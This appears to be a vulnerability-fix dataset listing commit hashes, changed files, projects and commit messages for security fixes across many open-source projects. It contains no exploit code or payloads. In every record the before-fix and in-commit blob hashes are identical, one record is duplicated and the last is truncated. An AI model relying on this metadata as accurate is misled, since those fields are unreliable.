Commit With Fix: 
    3b0fe05cddd8910f84e51b4d50099702ea45ba4a
File(s) In Commit: 
    coders/art.c
Blob(s) In Commit: 
    f96083245b23a9e0abb325b4267f65f7a0c5825e
Blob(s) Before Fix: 
    f96083245b23a9e0abb325b4267f65f7a0c5825e
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 3b0fe05cddd8910f84e51b4d50099702ea45ba4a:
Fixed memory leak reported in #456.

======================================================================
Commit With Fix: 
    9933e113c2e87a9f46a40fde8dafbf801dca1ab9
File(s) In Commit: 
    crypto/skcipher.c
Blob(s) In Commit: 
    4faa0fd53b0c120d39022ad726dbbe2c74f787bd
Blob(s) Before Fix: 
    4faa0fd53b0c120d39022ad726dbbe2c74f787bd
Projects:
    0-T-0_ps4-linux
Commit Message for 9933e113c2e87a9f46a40fde8dafbf801dca1ab9:
crypto: skcipher - Add missing API setkey checks\n\nThe API setkey checks for key sizes and alignment went AWOL during the skcipher conversion.  This patch restores them.\n\nCc: <stable@vger.kernel.org> Fixes: 4e6c3df4d729 ("crypto: skcipher - Add low-level skcipher...") Reported-by: Baozeng <sploving1@gmail.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>

======================================================================
Commit With Fix: 
    a924f43f30f9c4acaf70618dd2a055f8b0f166be
File(s) In Commit: 
    src/resolve/resolved-dns-packet.c
Blob(s) In Commit: 
    240ee448f4e9382206ed88575b87192547c24300
Blob(s) Before Fix: 
    240ee448f4e9382206ed88575b87192547c24300
Projects:
    0x277F_systemd
Commit Message for a924f43f30f9c4acaf70618dd2a055f8b0f166be:
resolved: bugfix of null pointer p->question dereferencing (#6020)\n\nSee https://bugs.launchpad.net/ubuntu/+source/systemd/+bug/1621396

======================================================================
Commit With Fix: 
    690313a061f7a4fa614ec5cc8368b4f2284e059b
File(s) In Commit: 
    src/regexec.c
Blob(s) In Commit: 
    d4e577d96aa947d945956920201763db0abacf08
Blob(s) Before Fix: 
    d4e577d96aa947d945956920201763db0abacf08
Projects:
    0xflotus_oniguruma
Commit Message for 690313a061f7a4fa614ec5cc8368b4f2284e059b:
fix #57 : DATA_ENSURE() check must be before data access

======================================================================
Commit With Fix: 
    9690d3ab1f9bcd2db8cbe1fe3ee4a5da606b8814
File(s) In Commit: 
    src/regexec.c
Blob(s) In Commit: 
    2fa0f3d37e07d62954c8421205f8058e4f25a2fb
Blob(s) Before Fix: 
    2fa0f3d37e07d62954c8421205f8058e4f25a2fb
Projects:
    0xflotus_oniguruma
Commit Message for 9690d3ab1f9bcd2db8cbe1fe3ee4a5da606b8814:
fix #58 : access to invalid address by reg->dmin value

======================================================================
Commit With Fix: 
    3b63d12038c8d8fc278e81c942fa9bec7c704c8b
File(s) In Commit: 
    src/regparse.c
Blob(s) In Commit: 
    198874769206616786a063b13ad9ce1d2b7513a2
Blob(s) Before Fix: 
    198874769206616786a063b13ad9ce1d2b7513a2
Projects:
    0xflotus_oniguruma
Commit Message for 3b63d12038c8d8fc278e81c942fa9bec7c704c8b:
fix #60 : invalid state(CCS_VALUE) in parse_char_class()

======================================================================
Commit With Fix: 
    b690371bbf97794b4a1d3f295d4fb9a8b05d402d
File(s) In Commit: 
    src/regexec.c
Blob(s) In Commit: 
    c0626efd43b6ed410bb8dcdc86fc4e477b60c74f
Blob(s) Before Fix: 
    c0626efd43b6ed410bb8dcdc86fc4e477b60c74f
Projects:
    0xflotus_oniguruma
Commit Message for b690371bbf97794b4a1d3f295d4fb9a8b05d402d:
fix #59 : access to invalid address by reg->dmax value

======================================================================
Commit With Fix: 
    232cd35d0804cc241eb887bb8d4d9b3b9881c64a
File(s) In Commit: 
    net/ipv6/ip6_output.c
Blob(s) In Commit: 
    bf8a58a1c32d83a9605844075da5815be23a6bf1
Blob(s) Before Fix: 
    bf8a58a1c32d83a9605844075da5815be23a6bf1
Projects:
    0-T-0_ps4-linux
Commit Message for 232cd35d0804cc241eb887bb8d4d9b3b9881c64a:
ipv6: fix out of bound writes in __ip6_append_data()\n\nAndrey Konovalov and idaifish@gmail.com reported crashes caused by one skb shared_info being overwritten from __ip6_append_data()\n\nAndrey program lead to following state :\n\ncopy -4200 datalen 2000 fraglen 2040 maxfraglen 2040 alloclen 2048 transhdrlen 0 offset 0 fraggap 6200\n\nThe skb_copy_and_csum_bits(skb_prev, maxfraglen, data + transhdrlen, fraggap, 0)  is overwriting skb->head and skb_shared_info\n\nSince we apparently detect this rare condition too late, move the code earlier to even avoid allocating skb and risking crashes.\n\nOnce again, many thanks to Andrey and syzkaller team.\n\nSigned-off-by: Eric Dumazet <edumazet@google.com> Reported-by: Andrey Konovalov <andreyknvl@google.com> Tested-by: Andrey Konovalov <andreyknvl@google.com> Reported-by: <idaifish@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    b72293946951cc650eaf51f5d2f62ceac6335e12
File(s) In Commit: 
    core/inc/bigtree/apis/storage.php
Blob(s) In Commit: 
    7dda6925289951cb9cb8230429e111c860437415
Blob(s) Before Fix: 
    7dda6925289951cb9cb8230429e111c860437415
Projects:
    4v4t4r_BigTree-CMS
Commit Message for b72293946951cc650eaf51f5d2f62ceac6335e12:
Disabling phtml/pht files from being uploaded. https://github.com/bigtreecms/BigTree-CMS/issues/280

======================================================================
Commit With Fix: 
    36be628c2597fd0209224a09b17858294f49c585
File(s) In Commit: 
    modules/Base/Dashboard/Dashboard_0.php
Blob(s) In Commit: 
    0ad7041eaf2aabc42ecfa2201441778cdbad4d53
Blob(s) Before Fix: 
    0ad7041eaf2aabc42ecfa2201441778cdbad4d53
Projects:
    BramPeerlings_EPESI
Commit Message for 36be628c2597fd0209224a09b17858294f49c585:
Closes #196

======================================================================
Commit With Fix: 
    d67a9ca6fd06ca65d23e313bdbad1ef4dd3aa0df
File(s) In Commit: 
    rutil/dns/ares/ares_parse_a_reply.c
Blob(s) In Commit: 
    100f3848d7434b0182f67071a903ffd23f8d2fef
Blob(s) Before Fix: 
    100f3848d7434b0182f67071a903ffd23f8d2fef
Projects:
    AlanSchwartz_resiprocate
Commit Message for d67a9ca6fd06ca65d23e313bdbad1ef4dd3aa0df:
ares: Prevent buffer overlow in ares_parse_a_reply (CVE-2017-9454)\n\nThis buffer overflow is in the embedded copy of ares that will be used unless the external alternative c-ares is used by specifying the configure argument --with-c-ares.\n\nIt has been found with LibFuzzer from the LLVM project.

======================================================================
Commit With Fix: 
    7fd419441bc7103398e313558171d342c6315f44
File(s) In Commit: 
    coders/mpc.c
Blob(s) In Commit: 
    86359572d1ceb35af1272b1b6809f3cf77b1635b
Blob(s) Before Fix: 
    86359572d1ceb35af1272b1b6809f3cf77b1635b
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 7fd419441bc7103398e313558171d342c6315f44:
Added check for incorrect number of meta channels report in #492.

======================================================================
Commit With Fix: 
    01843366d6a7b96e22ad7bb67f3df7d9fd4d5d74
File(s) In Commit: 
    magick/image.c
Blob(s) In Commit: 
    24ec768b493ff8d2d6540ebeed0f95ad6b332c8d
Blob(s) Before Fix: 
    24ec768b493ff8d2d6540ebeed0f95ad6b332c8d
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 01843366d6a7b96e22ad7bb67f3df7d9fd4d5d74:
Fixed incorrect call to DestroyImage reported in #491.

======================================================================
Commit With Fix: 
    5c114c91d4ff31859fcd84cf8bf349b737b90d99
File(s) In Commit: 
    src/gc.c
Blob(s) In Commit: 
    19bc1ad4b2bb5103803a6a813567031cab2cdc78
Blob(s) Before Fix: 
    19bc1ad4b2bb5103803a6a813567031cab2cdc78
Projects:
    007lva_mruby
Commit Message for 5c114c91d4ff31859fcd84cf8bf349b737b90d99:
Clear unused stack region that may refer freed objects  fix #3596

======================================================================
Commit With Fix: 
    07678eca2cf9c9a18584e546c2b2a0d0c9a3150c
File(s) In Commit: 
    drivers/gpu/drm/vmwgfx/vmwgfx_surface.c
Blob(s) In Commit: 
    834bb10973a2eb87ec37c05a364e5d95b2184343
Blob(s) Before Fix: 
    834bb10973a2eb87ec37c05a364e5d95b2184343
Projects:
    0-T-0_ps4-linux
Commit Message for 07678eca2cf9c9a18584e546c2b2a0d0c9a3150c:
drm/vmwgfx: Make sure backup_handle is always valid\n\nWhen vmw_gb_surface_define_ioctl() is called with an existing buffer, we end up returning an uninitialized variable in the backup_handle.\n\nThe fix is to first initialize backup_handle to 0 just to be sure, and second, when a user-provided buffer is found, we will use the req->buffer_handle as the backup_handle.\n\nCc: <stable@vger.kernel.org> Reported-by: Murray McAllister <murray.mcallister@insomniasec.com> Signed-off-by: Sinclair Yeh <syeh@vmware.com> Reviewed-by: Deepak Rawat <drawat@vmware.com>

======================================================================
Commit With Fix: 
    3cd666558c89d9c4b27eb74bf6b8e81b4f6e7118
File(s) In Commit: 
    modules/Base/Lang/Administrator/update_translation.php
Blob(s) In Commit: 
    c65854bd320df18f0df3da71040d34ab84a9c2cc
Blob(s) Before Fix: 
    c65854bd320df18f0df3da71040d34ab84a9c2cc
Projects:
    BramPeerlings_EPESI
Commit Message for 3cd666558c89d9c4b27eb74bf6b8e81b4f6e7118:
Closes #185

======================================================================
Commit With Fix: 
    f237f3e09ecbaf59c897f5046538a7b1a3fa40c1
File(s) In Commit: 
    bin/gssstdio.c
Blob(s) In Commit: 
    01199fef373455390bfa319fddf1c748f133e1a5
Blob(s) Before Fix: 
    01199fef373455390bfa319fddf1c748f133e1a5
Projects:
    arpa2_knc
Commit Message for f237f3e09ecbaf59c897f5046538a7b1a3fa40c1:
knc: fix a couple of memory leaks.\n\nOne of these can be remotely triggered during the authentication phase which leads to a remote DoS possibility.\n\nPointed out by: Imre Rad <radimre83@gmail.com>

======================================================================
Commit With Fix: 
    ba1dbd78e5f1ed67c1b8d37ac89d90e5e330b628
File(s) In Commit: 
    lib/smtp.c
Blob(s) In Commit: 
    ecf10a41ac3746087a201e3a2cadeb4dd6dfacef
Blob(s) Before Fix: 
    ecf10a41ac3746087a201e3a2cadeb4dd6dfacef
Projects:
    0ca_curl
Commit Message for ba1dbd78e5f1ed67c1b8d37ac89d90e5e330b628:
smtp: use the upload buffer size for scratch buffer malloc\n\n... not the read buffer size, as that can be set smaller and thus cause a buffer overflow! CVE-2018-0500\n\nReported-by: Peter Wu Bug: https://curl.haxx.se/docs/adv_2018-70a2.html

======================================================================
Commit With Fix: 
    244d83bc3d859293f55812d48b3db168e581f6ab
File(s) In Commit: 
    stb_vorbis.c
Blob(s) In Commit: 
    49829d2c03c07cced5ccc83e7f5f1777f288a0f2
Blob(s) Before Fix: 
    49829d2c03c07cced5ccc83e7f5f1777f288a0f2
Projects:
    004307ec_stb
Commit Message for 244d83bc3d859293f55812d48b3db168e581f6ab:
fix unchecked length in stb_vorbis that could crash on corrupt/invalid files

======================================================================
Commit With Fix: 
    ce361a12e355f9e1e99c989f1ea056c9e502dbe7
File(s) In Commit: 
    atom/app/command_line_args.cc
Blob(s) In Commit: 
    e83eed46f2e1178367a8582ece3888b505429d5b
Blob(s) Before Fix: 
    e83eed46f2e1178367a8582ece3888b505429d5b
Projects:
    00cool_electron
Commit Message for ce361a12e355f9e1e99c989f1ea056c9e502dbe7:
Use case-insensitive switch comparisons

======================================================================
Commit With Fix: 
    980230645c8ea3b531b85401de5e4bca0f860e42
File(s) In Commit: 
    src/ios/CDVKeychain.m
Blob(s) In Commit: 
    6c2fea4cbb55b9fc204c9ac44404e49ac5e09c89
Blob(s) Before Fix: 
    6c2fea4cbb55b9fc204c9ac44404e49ac5e09c89
Projects:
    crees1_Keychain
Commit Message for 980230645c8ea3b531b85401de5e4bca0f860e42:
Fixing security issue\n\nPlugin logs sensitive information and that is considered as a security issue. iOS logs are can be easily accessed by attacker.    References:  https://www.owasp.org/index.php/Mobile_Top_10_2016-M2-Insecure_Data_Storage  https://www.kaspersky.com/blog/starbucks-moves-quick-to-fix-application-security-vulnerability/3510/ (Starbucks for instance had problem with placing sensitive data to iOS logs and that was a big scandal  -) )

======================================================================
Commit With Fix: 
    a8c4a82787b8b6c256d61bd5c42fb7f92d1bae00
File(s) In Commit: 
    memcached.c
Blob(s) In Commit: 
    044064fc8facc6e1610b4bebeeb78a5962bf411a
Blob(s) Before Fix: 
    044064fc8facc6e1610b4bebeeb78a5962bf411a
Projects:
    0xfacade_memcached
Commit Message for a8c4a82787b8b6c256d61bd5c42fb7f92d1bae00:
Don't overflow item refcount on get\n\nCounts as a miss if the refcount is too high. ASCII multigets are the only time refcounts can be held for so long.\n\ndoing a dirty read of refcount. is aligned.\n\ntrying to avoid adding an extra refcount branch for all calls of item_get due to performance. might be able to move it in there after logging refactoring simplifies some of the branches.

======================================================================
Commit With Fix: 
    a45b599ad808c3c982fdcdc12b0b8611c2f92824
File(s) In Commit: 
    drivers/scsi/sg.c
Blob(s) In Commit: 
    5c40d809830f85916a7ed210798e54b2522fcda7
Blob(s) Before Fix: 
    5c40d809830f85916a7ed210798e54b2522fcda7
Projects:
    0-T-0_ps4-linux
Commit Message for a45b599ad808c3c982fdcdc12b0b8611c2f92824:
scsi: sg: allocate with __GFP_ZERO in sg_build_indirect()\n\nThis shall help avoid copying uninitialized memory to the userspace when calling ioctl(fd, SG_IO) with an empty command.\n\nReported-by: syzbot+7d26fc1eea198488deab@syzkaller.appspotmail.com Cc: stable@vger.kernel.org Signed-off-by: Alexander Potapenko <glider@google.com> Acked-by: Douglas Gilbert <dgilbert@interlog.com> Reviewed-by: Johannes Thumshirn <jthumshirn@suse.de> Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

======================================================================
Commit With Fix: 
    72a02ebaaf95a80e26127ee7ee2b123cccce05a7
File(s) In Commit: 
    application/third_party/pclzip/pclzip.lib.php
Blob(s) In Commit: 
    8c7cbc79395a1c36ec8a2cbf1bf109e28dc8b464
Blob(s) Before Fix: 
    8c7cbc79395a1c36ec8a2cbf1bf109e28dc8b464
Projects:
    3limin4t0r_LimeSurvey
Commit Message for 72a02ebaaf95a80e26127ee7ee2b123cccce05a7:
[security] fixed issue #13959: RCE via resource file upload as authenticated user\n\n

======================================================================
Commit With Fix: 
    7ebf02af2e90f03e0dbd0e18b8b3164f372fb97c
File(s) In Commit: 
    soundlib/Snd_fx.cpp
Blob(s) In Commit: 
    29f93c1de1625eec870c49d89f9b69708f3e8ba4
Blob(s) Before Fix: 
    29f93c1de1625eec870c49d89f9b69708f3e8ba4
Projects:
    DW01_openmpt
Commit Message for 7ebf02af2e90f03e0dbd0e18b8b3164f372fb97c:
[Fix] Possible out-of-bounds read when computing length of some IT files with pattern loops (OpenMPT: formats that are converted to IT, libopenmpt: IT/ITP/MO3), caught with afl-fuzz.\n\ngit-svn-id: https://source.openmpt.org/svn/openmpt/trunk/OpenMPT@10027 56274372-70c3-4bfc-bfc3-4c3a0b034d27

======================================================================
Commit With Fix: 
    62f64004fefb894c523a7143e8a88ebe6c84df25
File(s) In Commit: 
    adm-zip.js
Blob(s) In Commit: 
    634a96e540c9c9a0e02f70c5c633849cc71ad7bd
Blob(s) Before Fix: 
    634a96e540c9c9a0e02f70c5c633849cc71ad7bd
Projects:
    1534854467_adm-zip
Commit Message for 62f64004fefb894c523a7143e8a88ebe6c84df25:
Merge pull request #212 from aviadatsnyk/master\n\nfix: prevent extracting archived files outside of target path.  Credit to Snyk Security Research Team for disclosure and fixing the issue.

======================================================================
Commit With Fix: 
    5d121b2d3ae2a95abebc9dc31e4782cbc61a1f39
File(s) In Commit: 
    htdocs/admin/security_file.php
Blob(s) In Commit: 
    143cc17e46f44768ba41276c8db03bd19b382fc6
Blob(s) Before Fix: 
    143cc17e46f44768ba41276c8db03bd19b382fc6
Projects:
    01viniciusmelo_dolibarr
Commit Message for 5d121b2d3ae2a95abebc9dc31e4782cbc61a1f39:
FIX CVE-2018-10092

======================================================================
Commit With Fix: 
    7ade4e37f24d6859987bb9f6232f604325633fdd
File(s) In Commit: 
    htdocs/adherents/list.php
Blob(s) In Commit: 
    68062b895a09231f270186e169b52c96fe89b734
Blob(s) Before Fix: 
    68062b895a09231f270186e169b52c96fe89b734
Projects:
    01viniciusmelo_dolibarr
Commit Message for 7ade4e37f24d6859987bb9f6232f604325633fdd:
FIX CVE-2018-10094

======================================================================
Commit With Fix: 
    1dc466e1fb687cfe647de4af891720419823ed56
File(s) In Commit: 
    htdocs/adherents/cartes/carte.php
Blob(s) In Commit: 
    05b71ba1360bad80caeacd76307ff17be955fa29
Blob(s) Before Fix: 
    05b71ba1360bad80caeacd76307ff17be955fa29
Projects:
    01viniciusmelo_dolibarr
Commit Message for 1dc466e1fb687cfe647de4af891720419823ed56:
FIX CVE-2018-10095

======================================================================
Commit With Fix: 
    b51b21fc63c9805862322551387d9036f2b63433
File(s) In Commit: 
    mrbgems/mruby-io/src/io.c
Blob(s) In Commit: 
    6ace9e1673d1c919219dcb83f853a956227a9598
Blob(s) Before Fix: 
    6ace9e1673d1c919219dcb83f853a956227a9598
Projects:
    007lva_mruby
Commit Message for b51b21fc63c9805862322551387d9036f2b63433:
Fix `use after free in File#initilialize_copy`  fix #4001\n\nThe bug and the fix were reported by https://hackerone.com/pnoltof

======================================================================
Commit With Fix: 
    a642587a9c9e2dd7feacdf513c3643ce26ad3c22
File(s) In Commit: 
    src/readelf.c
Blob(s) In Commit: 
    1f41b46113c34006f10744d65c0c918b74dd63fc
Blob(s) Before Fix: 
    1f41b46113c34006f10744d65c0c918b74dd63fc
Projects:
    5hadowblad3_file
Commit Message for a642587a9c9e2dd7feacdf513c3643ce26ad3c22:
Avoid reading past the end of buffer (Rui Reis)

======================================================================
Commit With Fix: 
    098c2bc907443d67e9e18645f850e3de42941d20
File(s) In Commit: 
    components/account/update.htm
Blob(s) In Commit: 
    7d980daa3d1485f1ca62a3e5206ded4f9a551330
Blob(s) Before Fix: 
    7d980daa3d1485f1ca62a3e5206ded4f9a551330
Projects:
    Anglius_user-plugin
Commit Message for 098c2bc907443d67e9e18645f850e3de42941d20:
KISS and form_value() doesn't use escaping

======================================================================
Commit With Fix: 
    609bd17728ee1db0487a42d96028d30537528ae8
File(s) In Commit: 
    core/inc/bigtree/apis/storage.php
Blob(s) In Commit: 
    582bb7e4dda60136ce4c3c6997910970923fe8e4
Blob(s) Before Fix: 
    582bb7e4dda60136ce4c3c6997910970923fe8e4
Projects:
    4v4t4r_BigTree-CMS
Commit Message for 609bd17728ee1db0487a42d96028d30537528ae8:
Rejecting htaccess files: https://github.com/bigtreecms/BigTree-CMS/issues/335

======================================================================
Commit With Fix: 
    b588a2249c7abbfc52173e32ee11d6facef82f89
File(s) In Commit: 
    ngiflib.c
Blob(s) In Commit: 
    ac8dc2a54e92df0ebe18ca2e434a73af715cb0ef
Blob(s) Before Fix: 
    ac8dc2a54e92df0ebe18ca2e434a73af715cb0ef
Projects:
    miniupnp_ngiflib
Commit Message for b588a2249c7abbfc52173e32ee11d6facef82f89:
check GIF image position and dimensions\n\nfixes #1

======================================================================
Commit With Fix: 
    b71812168571fa55e44cdd0254471331b9c4c4c6
File(s) In Commit: 
    net/bridge/netfilter/ebtables.c
Blob(s) In Commit: 
    254ef9f4956790655652d92bd0b91b1a81f184d4
Blob(s) Before Fix: 
    254ef9f4956790655652d92bd0b91b1a81f184d4
Projects:
    0-T-0_ps4-linux
Commit Message for b71812168571fa55e44cdd0254471331b9c4c4c6:
netfilter: ebtables: CONFIG_COMPAT: don't trust userland offsets\n\nWe need to make sure the offsets are not out of range of the total size. Also check that they are in ascending order.\n\nThe WARN_ON triggered by syzkaller (it sets panic_on_warn) is changed to also bail out, no point in continuing parsing.\n\nBriefly tested with simple ruleset of -A INPUT --limit 1/s' --log plus jump to custom chains using 32bit ebtables binary.\n\nReported-by: <syzbot+845a53d13171abf8bf29@syzkaller.appspotmail.com> Signed-off-by: Florian Westphal <fw@strlen.de> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

======================================================================
Commit With Fix: 
    cf429e0a2fe26b5f01ce0c8e9b79432e94509b6e
File(s) In Commit: 
    ngiflib.c
Blob(s) In Commit: 
    32596d093dc5cca553f833b7f7d1acf50b589962
Blob(s) Before Fix: 
    32596d093dc5cca553f833b7f7d1acf50b589962
Projects:
    miniupnp_ngiflib
Commit Message for cf429e0a2fe26b5f01ce0c8e9b79432e94509b6e:
fix "pixel overrun"\n\nfixes #3

======================================================================
Commit With Fix: 
    a817755828cd0bfd4b87b0eb5cec59ffe57d3c3e
File(s) In Commit: 
    upload/templates/freshcat/js/backend.js
Blob(s) In Commit: 
    e4e07ff9a5b3fee690cccd3e8dc8a10eb143ca6d
Blob(s) Before Fix: 
    e4e07ff9a5b3fee690cccd3e8dc8a10eb143ca6d
Projects:
    ircoco_BlackCatCMS
Commit Message for a817755828cd0bfd4b87b0eb5cec59ffe57d3c3e:
fix for issue #384

======================================================================
Commit With Fix: 
    c1fa0768a8713b135848f78fd43ffc208d8ded70
File(s) In Commit: 
    arch/powerpc/kernel/ptrace.c
Blob(s) In Commit: 
    f52ad5bb710960906b8ae61400688845e2811dd5
Blob(s) Before Fix: 
    f52ad5bb710960906b8ae61400688845e2811dd5
Projects:
    0-T-0_ps4-linux
Commit Message for c1fa0768a8713b135848f78fd43ffc208d8ded70:
powerpc/tm: Flush TM only if CPU has TM feature\n\nCommit cd63f3c ("powerpc/tm: Fix saving of TM SPRs in core dump") added code to access TM SPRs in flush_tmregs_to_thread(). However flush_tmregs_to_thread() does not check if TM feature is available on CPU before trying to access TM SPRs in order to copy live state to thread structures. flush_tmregs_to_thread() is indeed guarded by CONFIG_PPC_TRANSACTIONAL_MEM but it might be the case that kernel was compiled with CONFIG_PPC_TRANSACTIONAL_MEM enabled and ran on a CPU without TM feature available, thus rendering the execution of TM instructions that are treated by the CPU as illegal instructions.\n\nThe fix is just to add proper checking in flush_tmregs_to_thread() if CPU has the TM feature before accessing any TM-specific resource, returning immediately if TM is no available on the CPU. Adding that checking in flush_tmregs_to_thread() instead of in places where it is called, like in vsr_get() and vsr_set(), is better because avoids the same problem cropping up elsewhere.\n\nCc: stable@vger.kernel.org # v4.13+ Fixes: cd63f3c ("powerpc/tm: Fix saving of TM SPRs in core dump") Signed-off-by: Gustavo Romero <gromero@linux.vnet.ibm.com> Reviewed-by: Cyril Bur <cyrilbur@gmail.com> Signed-off-by: Michael Ellerman <mpe@ellerman.id.au>

======================================================================
Commit With Fix: 
    a27e07d90a4608ceaf928b1babb27d4d803e1992
File(s) In Commit: 
    src/MirrorJob.cc
Blob(s) In Commit: 
    0be45431fb59bd42b75a26f34ffe7bb54b081797
Blob(s) Before Fix: 
    0be45431fb59bd42b75a26f34ffe7bb54b081797
Projects:
    Acidburn0zzz_lftp
Commit Message for a27e07d90a4608ceaf928b1babb27d4d803e1992:
mirror: prepend ./ to rm and chmod arguments to avoid URL recognition (fix #452)

======================================================================
Commit With Fix: 
    3deae701cdd89753cb6688302aee5b93a72bc58b
File(s) In Commit: 
    Upload/admin/modules/home/index.php
Blob(s) In Commit: 
    6b42ec07c45ce4220110e556f2c0d3a971b5b0c3
Blob(s) Before Fix: 
    6b42ec07c45ce4220110e556f2c0d3a971b5b0c3
Projects:
    0xB9_MyBB_Plugin-adminnotes
Commit Message for 3deae701cdd89753cb6688302aee5b93a72bc58b:
Add CSRF Token to Clear Table

======================================================================
Commit With Fix: 
    8f396cf35a3826044b089141667a196454c0a587
File(s) In Commit: 
    src/auth/cephx/CephxSessionHandler.cc
Blob(s) In Commit: 
    802b93cda52dec609f7a18ae55550ee2cc2d9297
Blob(s) Before Fix: 
    802b93cda52dec609f7a18ae55550ee2cc2d9297
Projects:
    0003ydlom_ceph
Commit Message for 8f396cf35a3826044b089141667a196454c0a587:
auth/cephx/CephxSessionHandler: implement CEPHX_V2 calculation mode\n\nDerive the signature from the entire buffer (both cipher blocks).\n\nSigned-off-by: Sage Weil <sage@redhat.com>

======================================================================
Commit With Fix: 
    10080096879d1076756f62760d6daf582b6db722
File(s) In Commit: 
    app/View/Elements/eventattribute.ctp
Blob(s) In Commit: 
    65c50c39fd90e24f928af5fa4ddd6665c77155ae
Blob(s) Before Fix: 
    65c50c39fd90e24f928af5fa4ddd6665c77155ae
Projects:
    0-vortex_MISP
Commit Message for 10080096879d1076756f62760d6daf582b6db722:
fix: Reflected XSS via the event view\n\n- users arriving on an event view via a malicious URL with a javascript payload and then clicking on the show deleted attributes tab would trigger the payload\n\n- as reported by Jarek Kozluk from zbp.pl

======================================================================
Commit With Fix: 
    2305368eb70a26cab34c772c9ae88787f4c3e669
File(s) In Commit: 
    public_html/admin/vqmods.app/vqmods.inc.php
Blob(s) In Commit: 
    41792bc2325aa357b5721bac29dd92c9b3bb2ef6
Blob(s) Before Fix: 
    41792bc2325aa357b5721bac29dd92c9b3bb2ef6
Projects:
    1d10t_litecart
Commit Message for 2305368eb70a26cab34c772c9ae88787f4c3e669:
! Verify that uploads have valid xml and vqmod content

======================================================================
Commit With Fix: 
    e1182fac1afba92a4975917823a5f644bee7e6e8
File(s) In Commit: 
    libavcodec/mpeg4videoenc.c
Blob(s) In Commit: 
    f6a5992df776d0ea874badb5b64081f7ad57d91b
Blob(s) Before Fix: 
    f6a5992df776d0ea874badb5b64081f7ad57d91b
Projects:
    00ERNEST00_FFmpeg
Commit Message for e1182fac1afba92a4975917823a5f644bee7e6e8:
avcodec/mpeg4videoenc: Use 64 bit for times in mpeg4_encode_gop_header()\n\nFixes truncation Fixes Assertion n <= 31 && value < (1U << n) failed at libavcodec/put_bits.h:169 Fixes: ffmpeg_crash_2.avi\n\nFound-by: Thuan Pham <thuanpv@comp.nus.edu.sg>, Marcel Böhme, Andrew Santosa and Alexandru RazvanCaciulescu with AFLSmart\n\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    2fc108f60f98cd00813418a8754a46476b404a3c
File(s) In Commit: 
    libavcodec/mpeg4videodec.c
Blob(s) In Commit: 
    d0ebaac6e8e8c653bde7250714ee56dc00ed5969
Blob(s) Before Fix: 
    d0ebaac6e8e8c653bde7250714ee56dc00ed5969
Projects:
    00ERNEST00_FFmpeg
Commit Message for 2fc108f60f98cd00813418a8754a46476b404a3c:
avcodec/mpeg4videodec: Clear bits_per_raw_sample if it has originated from a previous instance\n\nFixes: assertion failure Fixes: ffmpeg_crash_5.avi\n\nFound-by: Thuan Pham <thuanpv@comp.nus.edu.sg>, Marcel Böhme, Andrew Santosa and Alexandru Razvan Caciulescu with AFLSmart Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    f57b660f49f830006766a8d4abc3b4af6e178063
File(s) In Commit: 
    src/api/app/models/bs_request_action_submit.rb
Blob(s) In Commit: 
    a08110ef40a1a4761e93bea4e2f115dbf2b2938c
Blob(s) Before Fix: 
    a08110ef40a1a4761e93bea4e2f115dbf2b2938c
Projects:
    Abdelhamidhenni_open-build-service
Commit Message for f57b660f49f830006766a8d4abc3b4af6e178063:
Ignore a project link in BsRequestAction.check_action_permission!\n\nThis makes sure that we check the permissions of the correct package. For instance, assume that the project "Staging" is a link project where the link points to the "Base" project. Also, assume that there exists a "Base/foo" package, but there exists no explicit "Staging/foo" package. Moreover, assume we check the permissions for the following "submit" action:\n\n<action type="submit">   <source project="Staging" package="foo"/>   <target project="an_arbitrary_project" package="foo"/> </action>\n\nIn this case, the old code checks if request acceptor can modify the "Base/foo" package (since it follows the project link). This is wrong because the "Staging/foo" package would be turned into a branch during accept. The new code checks the correct package because it does not follow the project link and requires that the source package exists in the source project. Requiring the existence of the source package potentially breaks artificial requests (for instance, a request where the "submit" action from above is preceded by a "submit" action that creates a "Staging/foo" package).\n\nNote: so far I was unable to exploit the old code - so this is just to avoid a potential future headache.\n\nFixes: commit 990ef7ccc ("[api][webui] Check access to source package")

======================================================================
Commit With Fix: 
    f57b660f49f830006766a8d4abc3b4af6e178063
File(s) In Commit: 
    src/api/app/models/bs_request_action_submit.rb
Blob(s) In Commit: 
    a08110ef40a1a4761e93bea4e2f115dbf2b2938c
Blob(s) Before Fix: 
    a08110ef40a1a4761e93bea4e2f115dbf2b2938c
Projects:
    Abdelhamidhenni_open-build-service
Commit Message for f57b660f49f830006766a8d4abc3b4af6e178063:
Ignore a project link in BsRequestAction.check_action_permission!\n\nThis makes sure that we check the permissions of the correct package. For instance, assume that the project "Staging" is a link project where the link points to the "Base" project. Also, assume that there exists a "Base/foo" package, but there exists no explicit "Staging/foo" package. Moreover, assume we check the permissions for the following "submit" action:\n\n<action type="submit">   <source project="Staging" package="foo"/>   <target project="an_arbitrary_project" package="foo"/> </action>\n\nIn this case, the old code checks if request acceptor can modify the "Base/foo" package (since it follows the project link). This is wrong because the "Staging/foo" package would be turned into a branch during accept. The new code checks the correct package because it does not follow the project link and requires that the source package exists in the source project. Requiring the existence of the source package potentially breaks artificial requests (for instance, a request where the "submit" action from above is preceded by a "submit" action that creates a "Staging/foo" package).\n\nNote: so far I was unable to exploit the old code - so this is just to avoid a potential future headache.\n\nFixes: commit 990ef7ccc ("[api][webui] Check access to source package")

======================================================================
Commit With Fix: 
    30610bda60cbfc058f90a1c0a17d0e8f4516221a
File(s) In Commit: 
    src/HTTPserver.cpp
Blob(s) In Commit: 
    68cffcfb5bad7574cd13dbb567c13ae5c9d574fd
Blob(s) Before Fix: 
    68cffcfb5bad7574cd13dbb567c13ae5c9d574fd
Projects:
    FrancescoStaccini_ntopng
Commit Message for 30610bda60cbfc058f90a1c0a17d0e8f4516221a:
Added code to randomize values returned by rand()

======================================================================
Commit With Fix: 
    2cb291191c93c7c4e371e22cb89805a5b31d6608
File(s) In Commit: 
    resip/stack/ConnectionBase.cxx
Blob(s) In Commit: 
    2ee7663d07bd2accfea2b0e3733a5dcfd502f38c
Blob(s) Before Fix: 
